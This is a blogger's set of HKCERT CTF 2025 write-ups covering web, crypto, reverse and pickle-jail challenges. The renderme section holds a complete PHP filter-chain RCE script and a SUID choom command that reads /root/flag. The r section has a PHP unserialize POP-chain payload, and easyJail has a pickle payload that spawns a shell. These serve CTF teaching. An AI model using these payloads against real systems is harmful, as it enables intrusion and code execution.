---
title: "HKCERT CTF 2025 — Writeup"
description: "My HKCERT CTF 2025 writeups: renderme web RCE and privesc, plus crypto (cruel_rsa, EC Fun, Loss N, Bivariate copper, Triple Key Cipher), misc pickle jail, reverse (easyjar SM4, findkey), and a PHP POP-chain web bug."
date: 2026-03-17T00:40:00+0800
lastmod: 2026-08-06T01:10:38+0800
tag: "CTF, HKCERT CTF, Web Exploitation, Cryptography, Reverse Engineering"
lang: en-US
---

# Introduction

This page collects my HKCERT CTF 2025 writeups. `renderme` came first, and I have since added the rest from my saved solve scripts.

~~呢條友好懶,完左咁耐先寫返啲 writeup 出黎~~

A note on flags: I wrote these up from the solve scripts I kept, and some of those scripts did not record the final flag string. Where that is the case I say so rather than guess. The method is what matters, and each script is reproducible against the original challenge.

## renderme

`renderme` is a very fun Web Exploitation challenge because it is not just one single trick. You need to first get code execution, then calm down and enumerate the machine properly, and only then do the privilege escalation.

### Challenge Overview

The goal of this challenge was straightforward: get RCE on the target, escalate privileges, and read the root flag.

After looking at the application behavior for a bit, it was pretty clear that user-controlled input was reaching a file inclusion sink. Once I saw that, my first thought was immediately `php://filter`, because this kind of bug often turns into LFI-to-RCE if the backend uses `include` or `require` carelessly.

### Initial Access - PHP Filter Chain RCE

The main bug here was that we could control data that eventually ended up inside a PHP file inclusion path. Instead of going down the usual path like log poisoning or upload tricks, I decided to use the PHP filter chain technique.

The theory is simple, but the actual payload is super ugly:

1. Start from a valid file that the target can include.
2. Wrap it with `php://filter`.
3. Use a long chain of `convert.iconv.*` filters to shape the byte stream.
4. Build a base64-encoded PHP payload in memory.
5. Decode it back into executable PHP before the final include happens.

In this case, the small stager I used was:

```php
<?=require$_POST[1]?>
```

I like this kind of stager because the first payload stays very small, while the actual second-stage payload can be sent later through `$_POST[1]`.

That is very useful when the injection point is annoying, filtered, or has length restrictions.

Of course, I did not generate the filter chain by hand. That would be painful. I used a helper script to automate the generation and get an interactive shell.

(https://github.com/synacktiv/php_filter_chain_generator)

```python
import base64
import sys

import requests

file_to_use = 'php://temp'

conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': '',
}

def generate_filter_chain(chain, debug_base64=False):
    encoded_chain = chain
    filters = 'convert.iconv.UTF8.CSISO2022KR|'
    filters += 'convert.base64-encode|'
    filters += 'convert.iconv.UTF8.UTF7|'
    for c in encoded_chain[::-1]:
        filters += conversions[c] + '|'
        filters += 'convert.base64-decode|'
        filters += 'convert.base64-encode|'
        filters += 'convert.iconv.UTF8.UTF7|'
    if not debug_base64:
        filters += 'convert.base64-decode'
    return f'php://filter/{filters}/resource={file_to_use}'

url = 'http://web-9a4ea3c259.challenge.xctf.org.cn/'

def execute_command(cmd, cwd=None):
    real_cmd = f'cd {cwd} && {cmd}' if cwd else cmd
    real_cmd = real_cmd.replace("'", "\\'")
    php_code = f"<?php echo 'RCE_START'; system('{real_cmd}'); echo 'RCE_END'; ?>"
    b64_code = base64.b64encode(php_code.encode('utf-8')).decode('utf-8').replace('=', '')
    payload = generate_filter_chain(b64_code)
    data = {
        'name': '<?=require$_POST[1]?>',
        '1': payload,
    }
    try:
        response = requests.post(url, data=data)
        if 'RCE_START' in response.text:
            return response.text.split('RCE_START')[1].split('RCE_END')[0]
        return f'[-] RCE failed. Response len: {len(response.text)}'
    except Exception as e:
        return f'[-] Error: {e}'

def main():
    if len(sys.argv) < 2:
        print('Usage: python3 exploit_rce_cmd.py <command>')
        sys.exit(1)
    cmd = ' '.join(sys.argv[1:])
    print(f'[+] Executing: {cmd}')
    print(execute_command(cmd))

if __name__ == '__main__':
    main()
```

### Shell Access and Enumeration

After the payload landed properly, I got code execution as `www-data`.

Basic enumeration showed:

- Debian GNU/Linux 13 (`trixie`)
- user: `www-data`
- host kernel exposed as `4.18.0-240.el8.x86_64`
- the target was running inside a Docker-like containerized environment

That last point matters a lot. A kernel version might look old and juicy at first glance, but once Docker or some containerized environment gets involved, a lot of public kernel privesc ideas become a waste of time.

### Privilege Escalation

At this stage I just did the usual thing, enumerate first, then decide what looks realistic.

#### Failed Attempts

Since the host kernel looked relatively old, I did try a few known kernel privesc directions first. None of them worked.

Looking back, that was not very surprising:

- the environment was containerized
- required kernel features were likely unavailable
- the kernel might already have had the relevant fixes

I also ran the normal enumeration flow to check writable paths, services, sudo rules, and other common misconfigurations.

#### PrivEsc - SUID `choom`

The actual breakthrough came from enumerating SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

One binary stood out:

```bash
/usr/bin/choom
```

`choom` is normally just a utility for adjusting the OOM killer score of a process. But once it is exposed as a SUID root binary and does not drop privileges properly, it turns into a very nice privesc vector.

This is a known GTFOBins trick, so after spotting it, the path was basically clear.

So instead of wasting more time on kernel stuff, I just used it directly:

```bash
/usr/bin/choom -n 0 -- cat /root/flag
```

That was enough to read the root flag and finish the challenge cleanly.

```text
flag{T4x3EMg2KD6J3VfCPvOiDqF17ntodEsU}
```

### Final Thoughts

What I liked about this challenge is that it did not stop at one clever web trick. It forced a full chain:

- identify the PHP inclusion weakness
- turn it into RCE with the filter-chain technique
- do realistic post-exploitation enumeration
- avoid tunnel vision on kernel exploits
- notice the much simpler SUID privesc route

The main lesson here is the same as always, after getting a shell, do not rush blindly into fancy exploits. Slow down, enumerate properly, and look for the boring stuff too. A lot of the time, the intended privesc is much simpler than the one you are trying to force.

我幾鐘意呢類 RCE 類別既, 因為我 Prefer HackTheBox/TryHackMe 類既 hack 機拎 shell 題目 ... :)

### Reference

- [GTFOBins - choom](https://gtfobins.github.io/gtfobins/choom/#suid)
- [Synacktiv - PHP filters chain](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)

## r

`r` is a PHP object-injection challenge. The entry point unserializes attacker input into a `RequestHandler`, and the trick is chaining two handlers so the anonymous-class instance is reused by reference.

### The POP chain

The payload builds two `RequestHandler` objects in an array. The first constructs an anonymous class whose file path points at `index.php`, and the second reuses that same object through a serialization back-reference (`r:3`), calling its `execute` method with the `cmd` parameter. The back-reference is what makes the object act as both the constructed handler and the executed one.

```python
import requests

url = "http://web-dc19f6392b.challenge.xctf.org.cn/"

def try_pwn(line):
    path = f"/var/www/html/index.php:{line}$0"
    anon_name = f"\x00class@anonymous{path}"
    name_len = len(anon_name)

    payload = (
        'a:2:{'
        'i:0;O:14:"RequestHandler":2:{'
        f's:9:"processor";O:{name_len}:"{anon_name}":1:{{s:6:"handle";N;}}'
        's:6:"action";a:2:{i:0;r:3;i:1;s:11:"__construct";}'
        '}'
        'i:1;O:14:"RequestHandler":2:{'
        's:9:"processor";r:3;'
        's:6:"action";a:2:{i:0;r:3;i:1;s:7:"execute";}'
        '}'
        '}'
    )
    r = requests.get(url, params={'p': payload, 'cmd': 'cat /flag'})
    return "flag{" in r.text

for l in [10, 6, 11, 9, 5]:
    if try_pwn(l):
        break
```

The unknown is the line number inside `index.php` where the anonymous class resolves, so the script sweeps a few likely values. The root cause is the usual one: never `unserialize` untrusted input when POP gadgets exist in scope.

## easyJail (Miscellaneous)

A Python pickle jail. The server blocks certain tokens with an `if token in data` substring check over the raw payload, so `os`, `sys`, and `set` can never appear literally.

### Bypassing the substring filter with octal escapes

Pickle string opcodes accept octal escapes, so the banned words can be spelled without their literal bytes ever appearing. The payload pushes `logging.root`, builds `posix.system` via `STACK_GLOBAL`, and calls it through `__setstate__`:

```python
import base64

# Octal escapes so "os", "sys", "set" never appear in the raw bytes
setstate_hex = b"S'\\137\\137\\163\\145\\164\\163\\164\\141\\164\\145\\137\\137'\n"
posix_hex    = b"S'\\160\\157\\163\\151\\170'\n"
system_hex   = b"S'\\163\\171\\163\\164\\145\\155'\n"

payload = (
    b"clogging\nroot\n"
    b"("
    + setstate_hex
    + posix_hex
    + system_hex
    + b"\x93"          # STACK_GLOBAL: posix.system
    b"d"               # DICT: {"__setstate__": posix.system}
    b"b"               # BUILD: logging.root.__setstate__({...})
    b"S'sh'\n"
    b"b"               # BUILD: posix.system('sh')
    b"."
)
print(base64.b64encode(payload).decode())
```

The lesson is that a substring blocklist over serialized data is not a sandbox. Pickle is code execution by design, and its escapes defeat naive filters.

## cruel_rsa (Cryptography)

An RSA variant where the primes have a shared structure (`p = 2ga + 1`, `q = 2gb + 1`) and the challenge leaks the top and bottom bits of the private exponent `d`. This is a partial-key-exposure attack.

### Approach

`d` is reconstructed as `d = dm * 2^209 + x * 2^74 + dl`, leaving 135 unknown middle bits. The solve sets up the RSA key relation `e*d = 1 + k*L` and uses a lattice/Coppersmith small-root search over the unknown middle, combined with recovering the shared factor `g` (a Blum prime around 226 bits). Once `d` is complete, the message decrypts directly.

```python
nbit = 512
kbit  = int(nbit * 0.51)   # 261
msbit = int(nbit * 0.103)  # 52  (top bits known)
lsbit = int(nbit * 0.145)  # 74  (bottom bits known)

shift_high = kbit - msbit  # 209
unknown_bits = shift_high - lsbit  # 135
# d = dm << 209 + x << 74 + dl, solve x via Coppersmith, then decrypt.
```

The full Sage script (lattice construction and factoring) is the artifact for this one. The flag was not recorded in my saved script.

## EC Fun (Cryptography)

A custom group disguised as rational maps over `F_p`. `have` is the group law and `fun` is a doubling-style map, together implementing scalar multiplication of a hidden 54-bit key. The goal is a discrete log.

### Approach

The key is only 54 bits, so a meet-in-the-middle baby-step giant-step over the custom group recovers it, using the map's own operations for the steps. Once the key is known, it is the AES key for the flag ciphertext.

```python
def scalar_mult(point, k):
    res = g1
    temp = point
    while k:
        if k & 1:
            res = have(res, temp)
        temp = fun(temp)
        k >>= 1
    return res

# BSGS over the custom group to recover the 54-bit key, then AES-ECB decrypt.
```

The takeaway is that dressing up a group as opaque polynomial fractions does not raise the discrete-log difficulty when the exponent is only 54 bits. The flag was not recorded in my saved script.

## Loss N (Cryptography)

RSA where you are given `c`, `d`, and `e` but not the modulus `n`. The primes are consecutive (`q = next_prime(p)`), so they are close.

### Recovering n from d

Since `e*d - 1 = k*phi(n)`, iterate small `k`, take `phi_n = (e*d - 1)/k`, and because `p` and `q` are adjacent, `p ≈ sqrt(phi_n)`. Search a small window around that square root for a prime `p` whose `(p-1)(q-1)` matches `phi_n`, then rebuild `n` and decrypt.

```python
ed_minus_1 = e * d - 1
for k in range(1, 100000):
    if ed_minus_1 % k:
        continue
    phi_n = ed_minus_1 // k
    p_approx = isqrt(phi_n)
    for offset in range(-5000, 5000):
        p = p_approx + offset
        if not is_prime(p):
            continue
        q = next_prime(p)
        if (p - 1) * (q - 1) == phi_n:
            n = p * q
            # decrypt pow(c, d, n)
```

Missing `n` is not much protection when `d` is known and the primes are consecutive. The flag was not recorded in my saved script.

## Bivariate copper (Cryptography)

An RSA challenge with a tiny factor plus a bivariate Coppersmith relation over two leaked, partially known values.

### Approach

`N` has a small factor, so trial division up to `2^25` splits it and the message decrypts by normal RSA. The remaining structure is two equations in unknowns `x1`, `x2` that are small (bounded by `2^244`), recovered by searching small `x1` and solving for a valid `x2` under the bound.

```python
for candidate_q in range(2, 2**25):
    if N % candidate_q == 0 and isPrime(candidate_q) and isPrime(N // candidate_q):
        q, p = candidate_q, N // candidate_q
        break
d = inverse(e, (p - 1) * (q - 1))
# message = pow(c, d, N); then solve the bivariate relation for the small roots.
```

A small factor makes `N` splittable outright, which undercuts the whole scheme. The flag was not recorded in my saved script.

## Triple Key Cipher (Cryptography)

A remote encryption oracle built on a custom byte cipher with a per-byte leak. The C source `triKeyEnc.c` describes the round, and the attack is an oracle recovery using modular inverses mod 256.

### Approach

The `hash_msg` step truncates and SHA-256s the input, and the cipher mixes bytes with operations invertible mod 256. Querying the oracle with chosen messages and reading the leak lets you invert the key bytes one at a time via the modular inverse.

```python
def mod_inverse(a, m=256):
    a = (a % m + m) % m
    def egcd(a, b):
        if a == 0:
            return b, 0, 1
        g, x1, y1 = egcd(b % a, a)
        return g, y1 - (b // a) * x1, x1
    _, x, _ = egcd(a, m)
    return x % m
# Query oracle, read per-byte leak, invert key bytes mod 256.
```

Byte operations that are invertible mod 256, plus a per-byte leak, give a clean oracle attack. The full pwntools client is the artifact. The flag was not recorded in my saved script.

## easyjar (Reverse Engineering)

A Java jar that encrypts the flag with a hand-rolled **SM4** implementation (`Sm4.class`). SM4 is a standard block cipher, so the whole thing is reversible once you port the S-box and key schedule out of the decompiled class.

### Reimplementing SM4 to decrypt

The solve reconstructs SM4 from the `Sm4.java` constants: the S-box (converted from signed Java bytes), the `FK` and `CK` schedule constants, and a modified `SBOX_P` built in the class's static block with an `0xA7` tweak and a per-index rotate. With the cipher rebuilt, decrypting is running SM4 in reverse.

```python
SBOX = [b & 0xFF for b in SBOX_RAW]           # signed -> unsigned
SBOX_P = [rotl8(SBOX[(i ^ 0xA7) & 0xFF], i & 3) for i in range(256)]

def tau(n):
    return (sbox_transform((n >> 24) & 0xFF) << 24
            | sbox_transform((n >> 16) & 0xFF) << 16
            | sbox_transform((n >> 8) & 0xFF) << 8
            | sbox_transform(n & 0xFF))

def T(n):
    t = tau(n)
    return t ^ rotl(t, 2) ^ rotl(t, 10) ^ rotl(t, 18) ^ rotl(t, 24)
```

A custom SM4 is still SM4. Port the constants faithfully and the key schedule inverts. The flag was not recorded in my saved script.

## findkey (Reverse Engineering)

A small binary that stores its strings XOR-encoded with a few single-byte keys.

### XOR key recovery

Three keys show up in the binary (`0x0B` for the prompt, `0x02` for the error, `0x21` for the success message). Decoding each suspicious string with its key reveals the plaintext, and a hidden 16-byte block gives the key material for the flag.

```python
def multi_xor_decode(s):
    return {hex(k): "".join(chr(ord(c) ^ k) for c in s) for k in (0x0B, 0x02, 0x21)}
```

Single-byte XOR over stored strings is trivially recoverable once the keys are read out of the binary. Note this is an AIS3-format challenge (`AIS3{...}`) that appeared in the set; the recovered inner value was `278-362-75136019`.
